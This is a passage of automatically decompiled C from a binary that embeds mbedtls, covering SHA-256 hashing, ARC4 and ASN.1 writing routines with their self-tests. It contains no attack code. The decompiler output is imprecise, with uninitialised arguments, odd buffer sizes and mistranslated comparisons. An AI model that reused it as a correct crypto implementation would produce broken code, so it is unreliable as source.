            v163 = *(int32_t *)(4 * v7 + (int32_t)&SHA256_Hash_constant_words_K__0x428a2f98__at_807c200);
            *(int32_t *)(v78 + 64) = v90;
            v91 = v90;
            v92 = ((0x4000000 * v107 | v107 / 64) ^ (0x200000 * v107 | v107 / 2048) ^ (128 * v107 | v107 / 0x2000000)) + v41 + ((v109 ^ v111) & v107 ^ v111) + v163 + v91;
            v32 = v92 + v42;
            v79 = v59;
            v52 = (int32_t *)(v79 + 60);
            v124 = *v52;
            v93 = v92 + ((0x40000000 * v106 | v106 / 4) ^ (0x80000 * v106 | v106 / 0x2000) ^ (1024 * v106 | v106 / 0x400000)) + ((v106 | v113) & v115 | v106 & v113);
            v125 = *v52;
            v126 = *(int32_t *)(v79 + 8);
            v149 = *(int32_t *)(v79 + 40);
            v127 = *v52;
            v94 = (v127 / 1024 ^ (0x2000 * v125 | v125 / 0x80000) ^ (0x8000 * v124 | v124 / 0x20000)) + v149 + v122 + ((0x2000000 * v126 | v126 / 128) ^ v126 / 8 ^ (0x4000 * v126 | v126 / 0x40000));
            v164 = *(int32_t *)(4 * v61 + (int32_t)&g125);
            *(int32_t *)(v79 + 68) = v94;
            v95 = (v32 & (v109 ^ v107) ^ v109) + v111 + v164 + ((0x4000000 * v32 | v32 / 64) ^ (0x200000 * v32 | v32 / 2048) ^ (128 * v32 | v32 / 0x2000000)) + v94;
            v33 = v95 + v115;
            v34 = ((0x40000000 * v93 | v93 / 4) ^ (0x80000 * v93 | v93 / 0x2000) ^ (1024 * v93 | v93 / 0x400000)) + ((v93 | v106) & v113 | v93 & v106) + v95;
            v80 = v59;
            v128 = *(int32_t *)(v80 + 12);
            v150 = *(int32_t *)(v80 + 44);
            v165 = *(int32_t *)(4 * v61 + (int32_t)&g126);
            v96 = ((0x2000000 * v128 | v128 / 128) ^ v128 / 8 ^ (0x4000 * v128 | v128 / 0x40000)) + v126 + ((0x2000 * v91 | v91 / 0x80000) ^ v91 / 1024 ^ (0x8000 * v91 | v91 / 0x20000)) + v150;
            *(int32_t *)(v80 + 72) = v96;
            v97 = v96;
            v98 = v165 + v109 + v97 + (v33 & (v32 ^ v107) ^ v107) + ((0x4000000 * v33 | v33 / 64) ^ (0x200000 * v33 | v33 / 2048) ^ (128 * v33 | v33 / 0x2000000));
            v166 = *(int32_t *)(4 * v61 + (int32_t)&g127);
            v35 = v98 + v113;
            v36 = ((0x40000000 * v34 | v34 / 4) ^ (0x80000 * v34 | v34 / 0x2000) ^ (1024 * v34 | v34 / 0x400000)) + ((v34 | v93) & v106 | v34 & v93) + v98;
            v81 = v59;
            v151 = *(int32_t *)(v81 + 48);
            v53 = (int32_t *)(v81 + 16);
            v129 = *v53;
            v130 = *v53;
            v131 = *v53;
            v37 = ((0x2000000 * v130 | v130 / 128) ^ (0x4000 * v129 | v129 / 0x40000) ^ v131 / 8) + v151 + v128 + ((0x2000 * v94 | v94 / 0x80000) ^ v94 / 1024 ^ (0x8000 * v94 | v94 / 0x20000));
            *(int32_t *)(v81 + 76) = v37;
            v38 = v166 + v107 + (v35 & (v33 ^ v32) ^ v32) + ((0x4000000 * v35 | v35 / 64) ^ (0x200000 * v35 | v35 / 2048) ^ (128 * v35 | v35 / 0x2000000)) + v37;
            v39 = v38 + v106;
            v40 = ((0x40000000 * v36 | v36 / 4) ^ (0x80000 * v36 | v36 / 0x2000) ^ (1024 * v36 | v36 / 0x400000)) + ((v36 | v34) & v93 | v36 & v34) + v38;
            v82 = v59;
            v132 = *(int32_t *)(v82 + 16);
            v152 = *(int32_t *)(v82 + 52);
            v54 = (int32_t *)(v82 + 20);
            v133 = *v54;
            v134 = *v54;
            v135 = *v54;
            v99 = ((0x2000000 * v134 | v134 / 128) ^ (0x4000 * v133 | v133 / 0x40000) ^ v135 / 8) + v152 + v132 + ((0x2000 * v97 | v97 / 0x80000) ^ v97 / 1024 ^ (0x8000 * v97 | v97 / 0x20000));
            v167 = *(int32_t *)(4 * v61 + (int32_t)&g128);
            *(int32_t *)(v82 + 80) = v99;
            v100 = v99;
            v101 = v167 + v32 + v100 + (v39 & (v35 ^ v33) ^ v33) + ((0x4000000 * v39 | v39 / 64) ^ (0x200000 * v39 | v39 / 2048) ^ (128 * v39 | v39 / 0x2000000));
            v41 = v101 + v93;
            v72 = v37;
            v42 = ((0x40000000 * v40 | v40 / 4) ^ (0x80000 * v40 | v40 / 0x2000) ^ (1024 * v40 | v40 / 0x400000)) + ((v40 | v36) & v34 | v40 & v36) + v101;
            v83 = v59;
            v136 = *(int32_t *)(v83 + 20);
            v153 = *(int32_t *)(v83 + 56);
            v55 = (int32_t *)(v83 + 24);
            v137 = *v55;
            v138 = *v55;
            v139 = *v55;
            v43 = ((0x2000000 * v138 | v138 / 128) ^ (0x4000 * v137 | v137 / 0x40000) ^ v139 / 8) + ((0x2000 * v72 | v72 / 0x80000) ^ (0x8000 * v72 | v72 / 0x20000) ^ v72 / 1024) + v153 + v136;
            v168 = *(int32_t *)(4 * v61 + (int32_t)&g129);
            *(int32_t *)(v83 + 84) = v43;
            v102 = (v41 & (v39 ^ v35) ^ v35) + v33 + v168 + ((0x4000000 * v41 | v41 / 64) ^ (0x200000 * v41 | v41 / 2048) ^ (128 * v41 | v41 / 0x2000000)) + v43;
            v44 = ((0x40000000 * v42 | v42 / 4) ^ (0x80000 * v42 | v42 / 0x2000) ^ (1024 * v42 | v42 / 0x400000)) + ((v42 | v40) & v36 | v42 & v40) + v102;
            v45 = v102 + v34;
            v84 = v59;
            v140 = *(int32_t *)(v84 + 24);
            v154 = *(int32_t *)(v84 + 60);
            v56 = (int32_t *)(v84 + 28);
            v141 = *v56;
            v142 = *v56;
            v143 = *v56;
            v103 = ((0x2000000 * v142 | v142 / 128) ^ (0x4000 * v141 | v141 / 0x40000) ^ v143 / 8) + v154 + v140 + ((0x2000 * v100 | v100 / 0x80000) ^ v100 / 1024 ^ (0x8000 * v100 | v100 / 0x20000));
            *(int32_t *)(v84 + 88) = v103;
            v183 = *(int32_t *)(4 * v61 + (int32_t)&g130);
            v104 = v103 + v35 + v183 + (v45 & (v41 ^ v39) ^ v39) + ((0x4000000 * v45 | v45 / 64) ^ (0x200000 * v45 | v45 / 2048) ^ (128 * v45 | v45 / 0x2000000));
            v85 = v59;
            v144 = *(int32_t *)(v85 + 28);
            v46 = v104 + v36;
            v47 = ((0x40000000 * v44 | v44 / 4) ^ (0x80000 * v44 | v44 / 0x2000) ^ (1024 * v44 | v44 / 0x400000)) + ((v44 | v42) & v40 | v44 & v42) + v104;
            v145 = *(int32_t *)(v85 + 32);
            v73 = v43;
            v48 = ((0x2000000 * v145 | v145 / 128) ^ v145 / 8 ^ (0x4000 * v145 | v145 / 0x40000)) + v144 + v91 + ((0x2000 * v73 | v73 / 0x80000) ^ v73 / 1024 ^ (0x8000 * v73 | v73 / 0x20000));
            *(int32_t *)(v85 + 92) = v48;
            v86 = v61;
            v184 = *(int32_t *)(4 * v86 + (int32_t)&g131);
            v49 = v48 + v39 + v184 + (v46 & (v45 ^ v41) ^ v41) + ((0x4000000 * v46 | v46 / 64) ^ (0x200000 * v46 | v46 / 2048) ^ (128 * v46 | v46 / 0x2000000));
            v7 = v86 + 8;
            v61 = v7;
            v8 = v59 + 32;
            v59 = v8;
            v105 = v49 + ((0x40000000 * v47 | v47 / 4) ^ (0x80000 * v47 | v47 / 0x2000) ^ (1024 * v47 | v47 / 0x400000)) + ((v47 | v44) & v42 | v47 & v44);
            // continue -> 0x80676b8
        }
        // 0x8067e33
        v146 = a1;
        v58 = (int32_t *)(v146 + 8);
        *v58 = *v58 + v105;
        v10 = 1;
        if (v10 == 8) {
            // 0x8067e90
            g3 = v3;
            return 8;
        }
        v155 = 4 * v10;
        v57 = (int32_t *)(v146 + 8 + v155);
        *v57 = *v57 + *(int32_t *)(v155 - 44 + v2);
        v9 = v10 + 1;
        while (v9 != 8) {
            // 0x8067e80
            v155 = 4 * v9;
            v57 = (int32_t *)(v146 + 8 + v155);
            *v57 = *v57 + *(int32_t *)(v155 - 44 + v2);
            v9++;
            // continue -> 0x8067e80
        }
        // 0x8067e90
        g3 = v3;
        return 8;
    }
}

// Address range: 0x8067ea0 - 0x8067ebf
int32_t mbedtls_sha256_init(char * a1) {
    // 0x8067ea0
    memset(a1, 0, 27);
    return 0;
}

// Address range: 0x8067ec0 - 0x8067faf
int32_t mbedtls_sha256_update(char * a1, char * a2, uint32_t a3) {
    int32_t v1 = g5; // 0x8067ec3
    int32_t v2 = g7; // 0x8067ec4
    int32_t v3 = g3; // 0x8067ec5
    g3 = a3;
    g7 = (int32_t)a1;
    g5 = (int32_t)a2;
    if (a3 == 0) {
        // 0x8067f34
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return g1;
    }
    uint32_t v4 = *(int32_t *)a1; // 0x8067ed6
    int32_t v5 = v4 % 64; // 0x8067eda
    int32_t v6 = v4 + a3; // 0x8067edd
    g1 = v6;
    int32_t v7 = 64 - v5; // edx
    *(int32_t *)a1 = v6;
    if (v6 < a3) {
        int32_t * v8 = (int32_t *)(g7 + 4); // 0x8067ef1_0
        *v8 = *v8 + 1;
        // branch -> 0x8067ef5
    }
    int32_t v9 = g3; // 0x8067ef5
    int32_t v10 = v9; // 0x8067ef9
    int32_t v11; // 0x8067f30
    if (v9 >= v7) {
      lab_0x8067f60:
        // 0x8067f60
        g1 = v5;
        if (v5 == 0) {
            // 0x8067f60
            v10 = g3;
            v5 = 0;
            // branch -> 0x8067ef9
        } else {
            int32_t v12 = g7 + 40; // 0x8067f6a
            memcpy((char *)(v12 + v5), (char *)g5, v7);
            mbedtls_sha256_process(g7, v12);
            g1 = 8;
            g5 += v7;
            int32_t v13 = g3 - v7; // 0x8067fa1
            g3 = v13;
            v10 = v13;
            v5 = 0;
            // branch -> 0x8067ef9
        }
        // 0x8067ef9
        v11 = v10;
        if (v10 >= 64) {
          lab_0x8067efe:;
            int32_t v14 = 0; // 0x8067f00
            mbedtls_sha256_process(g7, g5 + v14);
            int32_t v15 = g3; // 0x8067f15
            // branch -> 0x8067f00
            while (v15 - (v14 + 64) > 63) {
                // 0x8067f00
                v14 += 64;
                mbedtls_sha256_process(g7, g5 + v14);
                v15 = g3;
                // continue -> 0x8067f00
            }
            uint32_t v16 = v15 - 64; // 0x8067f21
            g1 = v16 & -64;
            v11 = v16 % 64;
            // branch -> 0x8067f30
        }
      lab_0x8067f30:
        // 0x8067f30
        if (v11 != 0) {
            // 0x8067f40
            v7 = v5;
            int32_t v17 = g7; // 0x8067f49
            g3 = v3;
            g7 = v2;
            g5 = v1;
            int32_t v18;
            int32_t v19;
            memcpy((char *)v19, (char *)v18, v5 + 40 + v17);
            // branch -> 0x8067f60
            goto lab_0x8067f60;
        }
        // 0x8067f30
        // branch -> 0x8067f34
        // 0x8067f34
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return g1;
    }
    // 0x8067ef9
    if (v10 < 64) {
        v11 = v10;
        goto lab_0x8067f30;
    }
    goto lab_0x8067efe;
}

// Address range: 0x8067fb0 - 0x806815f
// Used cryptographic patterns:
//  - padding_used_in_hashing_algorithms__0x80_0_____0_ (8-bit, little endian)
int32_t mbedtls_sha256_finish(int32_t * a1, char * a2) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = g5; // 0x8067fb3
    int32_t v3 = g7; // 0x8067fb4
    int32_t v4 = g3; // 0x8067fb5
    g3 = v1;
    g7 = (int32_t)a2;
    uint32_t v5 = *(int32_t *)(v1 + 4); // 0x8067fbf
    int32_t v6 = 0x1000000 * v5 / 0x200000 / 0x1000000;
    g5 = v5 / 32 % 0x1000000;
    uint32_t v7 = *a1 % 64; // 0x806800f
    int32_t v8 = (v7 > 55 ? 120 : 56) - v7;
    g1 = v8;
    mbedtls_sha256_update((char *)a1, "\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", v8);
    g1 = &v6;
    mbedtls_sha256_update((char *)g3, (char *)&v6, 8);
    *(char *)g7 = *(char *)(g3 + 11);
    *(char *)(g7 + 1) = (char)*(int16_t *)(g3 + 10);
    *(char *)(g7 + 2) = (char)(*(int32_t *)(g3 + 8) / 256);
    *(char *)(g7 + 3) = (char)*(int32_t *)(g3 + 8);
    *(char *)(g7 + 4) = *(char *)(g3 + 15);
    *(char *)(g7 + 5) = (char)*(int16_t *)(g3 + 14);
    *(char *)(g7 + 6) = (char)(*(int32_t *)(g3 + 12) / 256);
    *(char *)(g7 + 7) = (char)*(int32_t *)(g3 + 12);
    *(char *)(g7 + 8) = *(char *)(g3 + 19);
    *(char *)(g7 + 9) = (char)*(int16_t *)(g3 + 18);
    *(char *)(g7 + 10) = (char)(*(int32_t *)(g3 + 16) / 256);
    *(char *)(g7 + 11) = (char)*(int32_t *)(g3 + 16);
    *(char *)(g7 + 12) = *(char *)(g3 + 23);
    *(char *)(g7 + 13) = (char)*(int16_t *)(g3 + 22);
    *(char *)(g7 + 14) = (char)(*(int32_t *)(g3 + 20) / 256);
    *(char *)(g7 + 15) = (char)*(int32_t *)(g3 + 20);
    *(char *)(g7 + 16) = *(char *)(g3 + 27);
    *(char *)(g7 + 17) = (char)*(int16_t *)(g3 + 26);
    *(char *)(g7 + 18) = (char)(*(int32_t *)(g3 + 24) / 256);
    *(char *)(g7 + 19) = (char)*(int32_t *)(g3 + 24);
    *(char *)(g7 + 20) = *(char *)(g3 + 31);
    *(char *)(g7 + 21) = (char)*(int16_t *)(g3 + 30);
    *(char *)(g7 + 22) = (char)(*(int32_t *)(g3 + 28) / 256);
    *(char *)(g7 + 23) = (char)*(int32_t *)(g3 + 28);
    *(char *)(g7 + 24) = *(char *)(g3 + 35);
    *(char *)(g7 + 25) = (char)*(int16_t *)(g3 + 34);
    *(char *)(g7 + 26) = (char)(*(int32_t *)(g3 + 32) / 256);
    int32_t v9 = *(int32_t *)(g3 + 32); // 0x8068111
    int32_t result = v9; // eax
    *(char *)(g7 + 27) = (char)v9;
    if (*(int32_t *)(g3 + 104) == 0) {
        // 0x806811e
        *(char *)(g7 + 28) = *(char *)(g3 + 39);
        *(char *)(g7 + 29) = (char)*(int16_t *)(g3 + 38);
        *(char *)(g7 + 30) = (char)(*(int32_t *)(g3 + 36) / 256);
        int32_t v10 = *(int32_t *)(g3 + 36); // 0x8068135
        result = v10;
        *(char *)(g7 + 31) = (char)v10;
        // branch -> 0x806813b
    }
    // 0x806813b
    g3 = v4;
    g7 = v3;
    g5 = v2;
    return result;
}

// Address range: 0x8068160 - 0x806836f
int32_t mbedtls_sha256_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x8068163
    int32_t v2 = g7; // 0x8068164
    int32_t v3 = g3; // 0x8068165
    int32_t v4;
    g3 = &v4;
    mbedtls_sha256_init((char *)&v4);
    int32_t str;
    int32_t v5 = &str; // 0x806817a_0
    int32_t v6 = 0; // 0x806826023
    char * str2 = (char *)&g124;
    // branch -> 0x80681a3
    while (true) {
        int32_t v7 = v6 % 3; // 0x80681bb
        int32_t v8 = v6 == 2 | v6 < 2 ^ (1 - v6 & v6) < 0; // 0x80681d4
        int32_t v9 = 8 - v8; // 0x80681e4
        g7 = v9;
        if (a1 != 0) {
            // 0x80682a0
            printf("  SHA-%d test #%d: ", 32 * v9, v7 + 1);
            // branch -> 0x80681e6
        }
        // 0x80681e6
        mbedtls_sha256_starts((int32_t *)g3, v8);
        if (v7 == 2) {
            // 0x80682d8
            g1 = 0x61616161;
            int32_t v10;
            memset((char *)&v10, 0x61616161, 250);
            g5 = 1;
            mbedtls_sha256_update((char *)g3, (char *)&v10, 1000);
            // branch -> 0x80682f0
            while (g5 != 1000) {
                // 0x80682f0
                g5++;
                mbedtls_sha256_update((char *)g3, (char *)&v10, 1000);
                // continue -> 0x80682f0
            }
          lab_0x806821b:
            // 0x806821b
            mbedtls_sha256_finish((int32_t *)g3, (char *)&str);
            uint32_t strncmp_rc = strncmp((char *)&str, str2, 4 * g7);
            g237 = strncmp_rc % 2 == 0;
            int32_t v11; // 0x8068283
            if (strncmp_rc % 2 == 0) {
              lab_0x8068247:
                // 0x8068247
                if (a1 != 0) {
                    // 0x806831a
                    puts("passed");
                    // branch -> 0x8068252
                }
                int32_t v12 = v6 + 1; // 0x8068252
                if (v12 == 6) {
                    // 0x806826d
                    int32_t v13;
                    g1 = &v13;
                    if (a1 != 0) {
                        // 0x806832b
                        putchar(10);
                        g1 = 0;
                        // branch -> 0x8068280
                    }
                    // 0x8068280
                    *(char *)g3 = 0;
                    v11 = g3 + 1;
                    g3 = v11;
                    // branch -> 0x8068280
                    while (v11 != v5) {
                        // 0x8068280
                        *(char *)v11 = 0;
                        v11 = g3 + 1;
                        g3 = v11;
                        // continue -> 0x8068280
                    }
                    // 0x806828e
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return g1;
                }
                // 0x8068252
                v6 = v12;
                str2 = (char *)((int32_t)str2 + 32);
                // branch -> 0x80681a3
                continue;
            } else {
                // 0x806833e
                g1 = 1;
                if (a1 != 0) {
                    // 0x806834e
                    puts("failed");
                    g1 = 1;
                    // branch -> 0x8068280
                }
            }
            // 0x8068280
            *(char *)g3 = 0;
            v11 = g3 + 1;
            g3 = v11;
            // branch -> 0x8068280
            while (v11 != v5) {
                // 0x8068280
                *(char *)v11 = 0;
                v11 = g3 + 1;
                g3 = v11;
                // continue -> 0x8068280
            }
            // 0x806828e
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return g1;
        }
        int32_t v14 = *(int32_t *)(4 * v7 + 0x807c020); // 0x80681fb
        g1 = v14;
        int32_t v15 = 57 * v7 + 0x807c040; // 0x8068208
        g5 = v15;
        mbedtls_sha256_update((char *)g3, (char *)v15, v14);
        // branch -> 0x806821b
        goto lab_0x806821b;
    }
}

// Address range: 0x8068370 - 0x80683df
int32_t mbedtls_sha256(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = g3; // 0x8068373
    int32_t v2;
    int32_t v3 = &v2; // 0x806837a_0
    g3 = v3;
    mbedtls_sha256_init((char *)&v2);
    mbedtls_sha256_starts((int32_t *)g3, a4);
    g1 = a1;
    mbedtls_sha256_update((char *)g3, (char *)a1, a2);
    mbedtls_sha256_finish((int32_t *)g3, (char *)a3);
    g1 = v3;
    int32_t v4;
    g6 = &v4;
    *(char *)v3 = 0;
    int32_t result = g1 + 1; // 0x80683c3
    g1 = result;
    // branch -> 0x80683c0
    while (result != g6) {
        // 0x80683c0
        *(char *)result = 0;
        result = g1 + 1;
        g1 = result;
        // continue -> 0x80683c0
    }
    // 0x80683ca
    g3 = v1;
    int32_t v5;
    g2 = v5;
    return result;
}

// Address range: 0x80683e0 - 0x80683ff
int32_t mbedtls_arc4_free(char * a1) {
    int32_t result = (int32_t)a1;
    if (a1 == NULL) {
        // 0x80683fa
        return result;
    }
    // 0x80683ea
    g6 = result + 264;
    *(char *)result = 0;
    int32_t result2 = result + 1; // 0x80683f3
    // branch -> 0x80683f0
    while (result2 != g6) {
        // 0x80683f0
        *(char *)result2 = 0;
        result2++;
        // continue -> 0x80683f0
    }
    // 0x80683fa
    // branch -> 0x80683fa
    // 0x80683fa
    return result2;
}

// Address range: 0x8068400 - 0x806848f
int32_t mbedtls_arc4_setup(int32_t * a1, int32_t a2, uint32_t a3) {
    int32_t v1 = 0; // eax
    int32_t v2 = (int32_t)a1; // ebx
    *a1 = 0;
    *(int32_t *)(v2 + 4) = 0;
    int32_t v3 = v1; // 0x8068420
    *(char *)(v3 + 8 + v2) = (char)v3;
    int32_t v4 = v1 + 1; // 0x8068424
    // branch -> 0x8068420
    while (v4 != 256) {
        // 0x8068420
        v3 = v4;
        *(char *)(v3 + 8 + v2) = (char)v3;
        v4++;
        // continue -> 0x8068420
    }
    int32_t result = v2 + 256; // 0x806842e
    v1 = v2;
    int32_t v5 = 0; // edx
    int32_t v6 = 0; // 0x806844d
    // branch -> 0x806844a
    while (true) {
        int32_t v7 = v6 + 1; // edi
        int32_t v8 = v6; // 0x8068463
        if (v6 >= a3) {
            // 0x8068452
            v7 = 1;
            v8 = 0;
            // branch -> 0x8068459
        }
        char * v9 = (char *)(v2 + 8); // 0x8068459_0
        char v10 = *v9; // 0x8068459
        char v11 = *(char *)(v8 + a2); // 0x8068463
        int32_t v12 = ((int32_t)v11 + (int32_t)v10 + v5) % 256; // 0x806846d
        v5 = v12;
        *v9 = *(char *)(v2 + 8 + v12);
        v1++;
        *(char *)(v2 + 8 + v5) = v10;
        if (v1 == result) {
            // 0x8068488
            int32_t v13;
            g2 = v13;
            return result;
        }
        // 0x8068448
        v2 = v1;
        v6 = v7;
        // branch -> 0x806844a
    }
}

// Address range: 0x8068490 - 0x806851f
int32_t mbedtls_arc4_crypt(int32_t * a1, uint32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = v1; // eax
    int32_t v3 = *a1; // 0x80684a1
    int32_t v4 = *(int32_t *)(v1 + 4); // 0x80684a3
    g4 = v4;
    if (a2 == 0) {
        // 0x806850d
        *(int32_t *)v1 = v3;
        *(int32_t *)(v2 + 4) = g4;
        return 0;
    }
    int32_t v5 = 0; // edx
    // branch -> 0x80684b0
    while (true) {
        int32_t v6 = (v3 + 1) % 256; // 0x80684b6
        int32_t v7 = v1 + 8; // 0x80684bf
        char * v8 = (char *)(v6 + v7); // 0x80684bf_0
        int32_t v9 = (int32_t)*v8; // 0x80684bf
        int32_t v10 = v9; // esi
        int32_t v11 = (v9 + v4) % 256; // 0x80684ca
        g4 = v11;
        unsigned char v12 = *(char *)(v11 + v7); // 0x80684cd
        *v8 = v12;
        *(char *)(v2 + 8 + g4) = (char)v10;
        char v13 = *(char *)(v2 + 8 + (v10 + (int32_t)v12) % 256); // 0x80684f2
        int32_t v14 = v5; // 0x80684f7
        char v15 = *(char *)(v14 + a3); // 0x80684f7
        *(char *)(v14 + a4) = v15 ^ v13;
        int32_t v16 = v5 + 1; // 0x8068502
        v5 = v16;
        if (v16 >= a2) {
            // 0x806850a
            // branch -> 0x806850d
            // 0x806850d
            *(int32_t *)v2 = v6;
            *(int32_t *)(v2 + 4) = g4;
            return 0;
        }
        // 0x80684b0
        v4 = g4;
        v1 = v2;
        v3 = v6;
        // branch -> 0x80684b0
    }
}

// Address range: 0x8068520 - 0x806853f
int32_t mbedtls_arc4_init(char * a1) {
    // 0x8068520
    memset(a1, 0, 66);
    return 0;
}

// Address range: 0x8068540 - 0x806870f
int32_t mbedtls_arc4_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x8068543
    int32_t v2 = g7; // 0x8068544
    int32_t v3 = g3; // 0x8068545
    int32_t v4;
    int32_t v5 = &v4; // 0x806854c_0
    int32_t str;
    g3 = &str;
    mbedtls_arc4_init((char *)&v4);
    int32_t v6 = 0; // 0x806867822
    int32_t v7 = 1; // 0x80686b521
    // branch -> 0x8068571
  lab_0x8068571:;
    int32_t v8; // 0x80686a3
    int32_t v9; // 0x806868c
    while (true) {
        // 0x8068571
        if (a1 != 0) {
            // 0x80686b5
            printf("  ARC4 test #%d: ", v7);
            // branch -> 0x806857c
        }
        // 0x806857c
        g5 = v5;
        mbedtls_arc4_setup(&v4, v6 + (int32_t)&g132, 8);
        int32_t v10 = 0; // eax
        int32_t v11;
        int32_t v12 = v11; // 0x80685f3
        int32_t v13 = v4; // 0x80685e720
        // branch -> 0x80685d0
        while (true) {
            int32_t v14 = (v13 + 1) % 256; // 0x80685d9
            int32_t v15 = g2 - 296; // 0x80685df
            char * v16 = (char *)(v15 + v14); // 0x80685df_0
            int32_t v17 = (int32_t)*v16; // 0x80685df
            int32_t v18 = v17; // esi
            int32_t v19 = v14; // edi
            int32_t v20 = (v17 + v12) % 256; // 0x80685f6
            int32_t v21 = v20; // edx
            unsigned char v22 = *(char *)(v20 + v15); // 0x80685f9
            *v16 = v22;
            *(char *)(g2 - 296 + v21) = (char)v18;
            int32_t v23 = g2; // 0x8068621
            int32_t v24 = v10; // 0x8068621
            char v25 = *(char *)(v23 - 32 + v24); // 0x8068621
            char v26 = *(char *)(v23 - 296 + (v18 + (int32_t)v22) % 256); // 0x806862c
            *(char *)(g3 + v24) = v26 ^ v25;
            int32_t v27 = v10 + 1; // 0x806863b
            v10 = v27;
            if (v27 == 8) {
                // 0x8068643
                v4 = v19;
                uint32_t strncmp_rc = strncmp((char *)&str, (char *)(v6 + (int32_t)&g133), 8);
                g237 = strncmp_rc % 2 == 0;
                if (strncmp_rc % 2 == 0) {
                    // 0x806866a
                    g7 = a1;
                    v9 = 0;
                    if (a1 != 0) {
                        // 0x80686d0
                        puts("passed");
                        v9 = a1;
                        // branch -> 0x8068671
                    }
                    int32_t v28 = v7 + 1; // 0x8068671
                    if (v28 == 4) {
                        // break (via goto) -> 0x806868c
                        goto lab_0x806868c;
                    }
                    a1 = v9;
                    v11 = v21;
                    v6 += 8;
                    v7 = v28;
                    // continue (via goto) -> 0x8068571
                    goto lab_0x8068571;
                } else {
                    // 0x80686ee
                    g1 = 1;
                    if (a1 != 0) {
                        // 0x80686fa
                        puts("failed");
                        g1 = 1;
                        // branch -> 0x8068695
                    }
                }
                // 0x8068695
                *(char *)v5 = 0;
                v8 = v5 + 1;
                // branch -> 0x80686a0
                while (v8 != g3) {
                    // 0x80686a0
                    *(char *)v8 = 0;
                    v8++;
                    // continue -> 0x80686a0
                }
                // 0x80686aa
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return g1;
            }
            // 0x80685d0
            v12 = v21;
            v13 = v14;
            // branch -> 0x80685d0
        }
    }
  lab_0x806868c:
    // 0x806868c
    g1 = 0;
    if (v9 != 0) {
        // 0x80686de
        putchar(10);
        g1 = 0;
        // branch -> 0x8068695
    }
    // 0x8068695
    *(char *)v5 = 0;
    v8 = v5 + 1;
    // branch -> 0x80686a0
    while (v8 != g3) {
        // 0x80686a0
        *(char *)v8 = 0;
        v8++;
        // continue -> 0x80686a0
    }
    // 0x80686aa
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return g1;
}

// Address range: 0x8068710 - 0x80687bf
int32_t mbedtls_asn1_write_len(int32_t * a1, int32_t a2, char a3) {
    int32_t v1 = a3; // edx
    int32_t v2 = (int32_t)a1; // eax
    int32_t v3 = g3; // 0x806871a
    g4 = a2;
    int32_t v4 = *a1; // 0x8068798
    uint32_t v5 = v4 - a2; // 0x806879c
    if (a3 > -1) {
        // 0x8068798
        if (v5 < 1) {
            // 0x8068788
            g3 = v3;
            return -108;
        }
        int32_t v6 = v4 - 1; // 0x80687a2
        g4 = v6;
        *a1 = v6;
        *(char *)(v4 - 1) = (char)v1;
        // branch -> 0x806875b
        // 0x806875b
        g3 = v3;
        return 1;
    }
    // 0x806872b
    if (v5 < 3) {
        // 0x8068788
        g3 = v3;
        return -108;
    }
    // 0x8068736
    *a1 = v4 - 1;
    *(char *)(v4 - 1) = (char)v1;
    int32_t * v7 = (int32_t *)v2; // 0x806873e_0
    int32_t v8 = *v7; // 0x806873e
    *v7 = v8 - 1;
    *(char *)(v8 - 1) = (char)(v1 / 256);
    int32_t * v9 = (int32_t *)v2; // 0x806874b_0
    int32_t v10 = *v9; // 0x806874b
    int32_t v11 = v10 - 1; // 0x806874d
    g4 = v11;
    *v9 = v11;
    *(char *)(v10 - 1) = -126;
    // branch -> 0x806875b
    // 0x806875b
    g3 = v3;
    return 3;
}

// Address range: 0x80687c0 - 0x80687fc
int32_t mbedtls_asn1_write_tag(int32_t * a1, int32_t a2, char a3) {
    // 0x80687c0
    g4 = (int32_t)a1;
    int32_t v1 = *a1; // 0x80687d8
    int32_t result; // 0x80687fc_2
    if (v1 - a2 >= 1) {
        // 0x80687e3
        *a1 = v1 - 1;
        *(char *)(v1 - 1) = (char)(int32_t)a3;
        result = 1;
        // branch -> 0x80687f2
    } else {
        result = -108;
    }
    // 0x80687f2
    return result;
}

// Address range: 0x80687fd - 0x80687ff
int32_t function_80687fd(int32_t a1) {
    // 0x80687fd
    return g7;
}

// Address range: 0x80688d7 - 0x80688df
int32_t function_80688d7(int32_t a1) {
    // 0x80688d7
    return g7;
}

// Address range: 0x8068bf7 - 0x8068bff
int32_t function_8068bf7(int32_t a1) {
    // 0x8068bf7
    return g7;
}

// Address range: 0x8068ee0 - 0x8068f9f
int32_t mbedtls_asn1_write_mpi(int32_t * a1, int32_t a2, int32_t * a3) {
    int32_t v1 = (int32_t)a3;
    int32_t v2 = g5; // 0x8068ee6
    g5 = v1;
    int32_t v3 = g3; // 0x8068eec
    int32_t v4 = g7; // 0x8068eef
    g7 = (int32_t)a1;
    int32_t v5 = mbedtls_mpi_size(v1); // 0x8068ef8
    g3 = v5;
    int32_t * v6 = (int32_t *)g7; // 0x8068eff_0
    int32_t v7 = *v6; // 0x8068eff
    int32_t result; // 0x8068f1b_2
    if (v7 - a2 < v5) {
        // 0x8068f0a
        result = -108;
        // branch -> 0x8068f0f
    } else {
        int32_t v8 = v7 - v5; // 0x8068f20
        *v6 = v8;
        int32_t v9 = mbedtls_mpi_write_binary((char *)g5, v8, g3); // 0x8068f2f
        if (v9 == 0) {
            // 0x8068f38
            int32_t * v10; // 0x8068f5b_0
            int32_t v11; // 0x8068f52
            int32_t v12; // 0x8068f5f
            int32_t v13; // 0x8068f5b
            int32_t v14; // 0x8068f6b
            int32_t v15; // 0x8068f66
            if (*(int32_t *)g5 == 1) {
                int32_t * v16 = (int32_t *)g7; // 0x8068f3d_0
                int32_t v17 = *v16; // 0x8068f3d
